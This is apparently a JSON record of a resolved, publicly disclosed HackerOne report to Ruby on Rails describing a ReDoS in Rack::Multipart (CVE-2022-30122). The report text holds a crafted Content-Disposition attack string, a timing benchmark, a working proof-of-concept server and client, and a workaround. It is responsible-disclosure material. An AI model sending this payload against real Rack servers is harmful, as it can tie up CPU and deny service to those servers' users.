@@ -1,0 +1,123 @@
+{
+  "id": 1489141,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDg5MTQx",
+  "url": "https://hackerone.com/reports/1489141",
+  "title": "ReDoS in Rack::Multipart",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2022-02-22T22:34:07.597Z",
+  "submitted_at": "2022-02-22T22:34:07.663Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ooooooo_q",
+    "url": "/ooooooo_q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/20fc426031f09e5347054871ae4e3af2478fd2b3d5e8a321468ecf6f2da5ac20"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-30122"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-07-28T00:26:27.997Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2023-06-28T00:26:26.045Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello, I found ReDoS on Rack.\n\nI found this problem using `recheck` (https://makenowjust-labs.github.io/recheck/), a ReDoS detection tool.\n\nThis tool has found multiple places where there seems to be a problem with the rack code, but since there are many and it takes time to check the behavior, I will first report on `Rack::Multipart::RFC2183`, which is the most dangerous.\nThis is detected as exponential by recheck.\n\n- https://github.com/rack/rack/blob/2.2.3/lib/rack/multipart.rb#L38\n- https://github.com/rack/rack/blob/2.2.3/lib/rack/multipart/parser.rb#L296\n\n```ruby\n❯ bundle exec irb\nirb(main):001:0> require 'rack'\n=> true\nirb(main):002:0> Rack::Multipart::RFC2183\n=> /^(?i-mx:Content-Disposition:\\s*(?-mix:[^\\s()<>,;:\\\\\"\\/\\[\\]?=]+)\\s*)((?-mix:;\\s*(?:(?-mix:((?-mix:(?-mix:(?-mix:[^ \\t\\v\\n\\r)(><@,;:\\\\\"\\/\\[\\]?='*%])+)(?-mix:\\*[0-9]+)?))=((?-mix:\"(?:\\\\\"|[^\"])*\"|(?-mix:[^\\s()<>,;:\\\\\"\\/\\[\\]?=]+))))|(?-mix:(?-mix:((?-mix:(?-mix:(?-mix:[^ \\t\\v\\n\\r)(><@,;:\\\\\"\\/\\[\\]?='*%])+)(?:\\*0)?\\*))=((?-mix:[a-zA-Z0-9\\-]*'[a-zA-Z0-9\\-]*'(?-mix:%[0-9a-fA-F]{2}|(?-mix:[^ \\t\\v\\n\\r)(><@,;:\\\\\"\\/\\[\\]?='*%]))*)))|(?-mix:((?-mix:(?-mix:(?-mix:[^ \\t\\v\\n\\r)(><@,;:\\\\\"\\/\\[\\]?='*%])+)\\*[1-9][0-9]*\\*))=((?-mix:%[0-9a-fA-F]{2}|(?-mix:[^ \\t\\v\\n\\r)(><@,;:\\\\\"\\/\\[\\]?='*%]))*))))\\s*))+$/i\n```\n\n\n### benchmark\n\nrfc2183_benchmark.rb\n\n```ruby\nrequire 'benchmark'\nrequire 'rack'\n\nregexp = Rack::Multipart::RFC2183\n\ndef attack_text(length)\n \"Content-Disposition:G;\\f=\\\"\"  + \"=;1=\\\";\\fD=\\\";t*1*\" * length + '='\nend\n\nBenchmark.bm do |x|\n  x.report { attack_text(5)[regexp] }\n  x.report { attack_text(10)[regexp] }\n  x.report { attack_text(15)[regexp] }\n  x.report { attack_text(20)[regexp] }\n  x.report { attack_text(25)[regexp] }\n  x.report { attack_text(26)[regexp] }\nend\n```\n\n```\n❯ bundle exec ruby rfc2183_benchmark.rb\n       user     system      total        real\n   0.000018   0.000004   0.000022 (  0.000016)\n   0.000357   0.000000   0.000357 (  0.000361)\n   0.010888   0.000018   0.010906 (  0.010961)\n   0.342814   0.000717   0.343531 (  0.344750)\n  10.925193   0.022059  10.947252 ( 10.979092)\n  21.906178   0.049380  21.955558 ( 22.024203)\n```\n\n\n### PoC\n\nGemfile\n\n```ruby\n# frozen_string_literal: true\n\nsource \"https://rubygems.org\"\n\ngem 'rack', '~> 2.2', '>= 2.2.3'\ngem 'puma', '~> 5.6', '>= 5.6.2'\n```\n\nconfig.ru\n\n```ruby\nclass Server\n  def call(env)\n    Rack::Request.new(env).params\n\n    [ 200, {}, []]\n  end\nend\n\nrun Server.new\n```\n\n```ruby\nrequire \"net/http\"\nrequire \"uri\"\n\nclass Net::HTTPGenericRequest\n\n  def encode_multipart_form_data(out, params, opt)\n    charset = opt[:charset]\n    boundary = opt[:boundary]\n    buf = ''\n    params.each do |key, value|\n      buf << \"--#{boundary}\\r\\n\"\n      buf << \"Content-Disposition:G;\\f=\\\"\"  + \"=;1=\\\";\\fD=\\\";t*1*\" * 27 + '='\n      buf << \"Content-Type: application/octet-stream\\r\\n\\r\\n\"\n\n      buf << \"content\"\n      buf << \"\\r\\n\"\n    end\n    buf << \"--#{boundary}--\\r\\n\"\n    flush_buffer(out, buf, false)\n  end\nend  \n\ndata = [[\"dummy\"]]\n\nurl = URI.parse('http://127.0.0.1:9292/')\nreq = Net::HTTP::Post.new(url.path)\nreq.set_form(data, \"multipart/form-data\")\n\nres = Net::HTTP.new(url.host, url.port).start do |http|\n  http.request(req)\nend\n```\n\n`bundle exec rackup` & `bundle exec ruby rfc2183_request.rb`\n\n## Impact\n\nWhen the client sends a specially crafted header, it occur ReDoS on the server side.\nI confirmed that the combination of puma, unicorn, puma + nginx, unicorn + nginx occur Redos.\n\nThere are several other places where `Rack::Multipart` is likely to be ReDoS, and it seems good to exclude it as a workaround if user do not use file upload.\n\n#### work around\n\n```ruby\nclass Rack::Request\n  def parse_multipart\n    nil\n  end\nend\n```",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2023-07-28T00:26:26.193Z",
+  "allow_singular_disclosure_after": -87835223.56373495,
+  "singular_disclosure_allowed": true,
+  "vote_count": 18,
+  "voters": [
+    "orange303",
+    "zy9ard3",
+    "0xpaier",
+    "neilx",
+    "sujal_meghwal",
+    "vlakhani28",
+    "shivammusic",
+    "as4c",
+    "crowr",
+    "kath27",
+    "and 8 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 160,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
